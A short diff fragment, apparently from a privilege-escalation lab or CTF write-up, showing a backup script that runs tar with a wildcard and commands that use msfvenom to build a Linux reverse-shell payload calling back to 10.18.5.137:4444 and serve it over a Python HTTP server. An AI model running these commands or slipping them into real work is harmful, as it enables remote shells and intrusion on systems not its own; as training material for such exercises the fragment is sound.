@@ -346,6 +346,7 @@ cat /usr/local/bin/compress.sh
 cd /home/user
 tar czf /tmp/backup.tar.gz *
 ```
+```
 cd /var/www/html/priv_esc
 sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=4444 -f elf -o shell.elf
 python3 -m http.server
